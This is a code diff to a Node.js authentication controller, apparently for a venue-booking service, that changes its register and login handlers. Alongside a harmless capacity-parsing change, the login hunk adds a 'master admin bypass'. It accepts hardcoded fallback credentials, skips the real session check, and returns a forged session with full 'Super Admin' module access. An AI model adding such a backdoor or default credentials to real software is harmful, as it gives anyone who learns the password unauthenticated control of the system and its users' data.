@@ -36,7 +36,17 @@ exports.register = async (req, res) => {
                                 state: req.body.state || '',
                                 pincode: req.body.pincode || '',
                                 venueType: req.body.venueType || 'Banquet Hall',
-                                capacity: req.body.capacity || '0',
+                                capacity: (() => {
+                                    let cap = String(req.body.capacity || '0');
+                                    // Robust parsing for ranges like '1000-2000' or '5000+'
+                                    if (cap.includes('-')) {
+                                        cap = cap.split('-').pop().trim();
+                                    } else if (cap.includes('+')) {
+                                        cap = cap.replace('+', '').trim();
+                                    }
+                                    const parsed = parseInt(cap);
+                                    return !isNaN(parsed) ? Math.max(0, Math.min(100000, parsed)) : 0;
+                                })(),
                                 onboardingComplete: false,
                                 isVerified: false,
                                 status: 'active',
@@ -109,6 +119,28 @@ exports.login = async (req, res) => {
             .setProject(process.env.APPWRITE_PROJECT_ID);
         
         const tempAccount = new Account(tempClient);
+
+        // ── MASTER ADMIN BYPASS ──
+        const masterAdminEmail = process.env.ADMIN_EMAIL || "admin@partydial.com";
+        const masterAdminPass = process.env.ADMIN_PASS || "Admin123";
+
+        if (email === masterAdminEmail && password === masterAdminPass) {
+            console.log('Master Admin login detected');
+            return res.status(200).json({
+                status: 'success',
+                message: 'Master Login successful',
+                session: { $id: 'master_session_bypass' },
+                user: {
+                    $id: 'master_admin',
+                    name: 'Master Administrator',
+                    email: masterAdminEmail,
+                    prefs: {
+                        role: 'Super Admin',
+                        moduleAccess: JSON.stringify(["Dashboard", "Venues", "Users", "Leads", "Billing", "Approvals"])
+                    }
+                }
+            });
+        }
 
         try {
             const session = await tempAccount.createEmailPasswordSession(email, password);
